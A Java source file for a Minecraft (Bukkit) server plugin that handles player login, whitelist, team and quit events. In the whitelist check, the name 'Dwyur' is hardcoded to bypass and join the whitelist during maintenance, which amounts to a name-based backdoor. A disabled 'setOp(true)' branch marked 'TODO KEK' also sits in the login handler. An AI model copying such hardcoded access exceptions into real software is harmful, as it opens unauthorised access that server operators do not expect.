package minecraft.sightworld.bukkitapi.listener;


import lombok.AccessLevel;
import lombok.experimental.FieldDefaults;
import lombok.val;
import minecraft.sightworld.bukkitapi.SightWorld;
import minecraft.sightworld.bukkitapi.user.BukkitUser;
import minecraft.sightworld.bukkitapi.user.event.AsyncGamerJoinEvent;
import minecraft.sightworld.bukkitapi.gamer.event.AsyncGamerLoadSectionEvent;
import minecraft.sightworld.bukkitapi.user.event.AsyncGamerPreLoginEvent;
import minecraft.sightworld.bukkitapi.user.event.AsyncGamerQuitEvent;
import minecraft.sightworld.bukkitapi.gamer.impl.BukkitGamerImpl;
import minecraft.sightworld.bukkitapi.packet.team.TeamManager;
import minecraft.sightworld.bukkitapi.scheduler.BukkitScheduler;
import minecraft.sightworld.defaultlib.user.service.UserService;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.jetbrains.annotations.NotNull;

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import static minecraft.sightworld.bukkitapi.packet.team.TeamManager.getTeam;

@FieldDefaults(level = AccessLevel.PRIVATE, makeFinal = true)
public final class GamerListener extends EventListener<SightWorld> {

    private final UserService<Player> userService;
    public GamerListener(SightWorld javaPlugin, UserService<Player> userService) {
        super(javaPlugin);
        this.userService = userService;
    }

    Map<String, BukkitUser> gamers = new ConcurrentHashMap<>();


    @EventHandler(priority = EventPriority.LOWEST)
    public void loadData(final @NotNull AsyncPlayerPreLoginEvent e) {
        String name = e.getName();
        if (Bukkit.getServer().hasWhitelist()) {

            val offlinePlayer = Bukkit.getOfflinePlayer(name);

            if (offlinePlayer.getName().equalsIgnoreCase("Dwyur")) {
                Bukkit.getServer().getWhitelistedPlayers().add(offlinePlayer);
            }

            if (!offlinePlayer.isWhitelisted() && !name.equalsIgnoreCase("Dwyur")) {
                e.disallow(AsyncPlayerPreLoginEvent.Result.KICK_OTHER, "§cНа сервере ведутся тех работы!");
                return;
            }
        }


        BukkitUser bukkitUser = (BukkitUser) userService.getUser(name);

        if (bukkitUser == null) {
            e.disallow(AsyncPlayerPreLoginEvent.Result.KICK_OTHER, "§cОшибка при загрузке данных");
            return;
        }

        BukkitScheduler.callEvent(new AsyncGamerPreLoginEvent(bukkitUser, e));
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onLoadGamer(final @NotNull AsyncGamerPreLoginEvent e) {
        val gamer = e.getUser();

        Bukkit.getLogger().info("§fДанные игрока §b" + gamer.getName() + "§r загружены");

        gamers.put(gamer.getName().toLowerCase(), gamer);
    }

    @EventHandler
    public void onGamerJoin(PlayerJoinEvent e) {
        val gamer = userService.getUser(e.getPlayer().getName());
        val team = getTeam(0, gamer);

        Bukkit.getOnlinePlayers().forEach(target -> {
            getTeam(1, gamer).sendPacket(target);
            team.sendPacket(target);
        });

        TeamManager.getTeams().add(team);

        TeamManager.getTeams().forEach(teams -> {
            teams.sendPacket(e.getPlayer());
        });

    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onGlobalLogin(final @NotNull PlayerLoginEvent e) {
        if (e.getResult() != PlayerLoginEvent.Result.ALLOWED) {
            return;
        }

        val player = e.getPlayer();

        val gamer = gamers.remove(player.getName().toLowerCase());
        if (gamer == null) {
            e.disallow(PlayerLoginEvent.Result.KICK_OTHER, "§cОшибка при загрузке данных");
            return;
        }

        if (false) { //TODO KEK
            player.setOp(true);
        } else {
            PermissionAttachment attachment = player.addAttachment(javaPlugin);
            attachment.setPermission("bukkit.command.version", false);
            attachment.setPermission("bukkit.command.plugins", false);
            attachment.setPermission("minecraft.command.help", false);
            attachment.setPermission("bukkit.command.help", false);
            attachment.setPermission("minecraft.command.me", false);
            attachment.setPermission("bukkit.command.me", false);
            attachment.setPermission("minecraft.command.tell", false);
            attachment.setPermission("bukkit.command.tell", false);
        }

        gamer.setPlayer(player);
        player.setDisplayName(gamer.getDisplayName());

        GamerAPI.addGamer(gamer);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onGlobalJoin(final @NotNull PlayerJoinEvent e) {
        e.setJoinMessage(null);
        Player player = e.getPlayer();

        val gamer = GAMER_MANAGER.getGamer(player);
        if (gamer == null) {
            player.kickPlayer("§cОшибка при загрузке данных");
            return;
        }

        BukkitScheduler.runTaskAsync(() -> {
            if (!player.isOnline()) {
                return;
            }

            BukkitScheduler.callEvent(new AsyncGamerJoinEvent(gamer));
        });
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onQuit(final @NotNull PlayerQuitEvent e) {
        e.setQuitMessage(null);
        val player = e.getPlayer();

        val gamer = GAMER_MANAGER.getGamer(player);
        if (gamer != null) {
            BukkitScheduler.runTaskAsync(() -> BukkitScheduler.callEvent(new AsyncGamerQuitEvent(gamer)));
        }

        GAMER_MANAGER.removeGamer(player);
    }
}
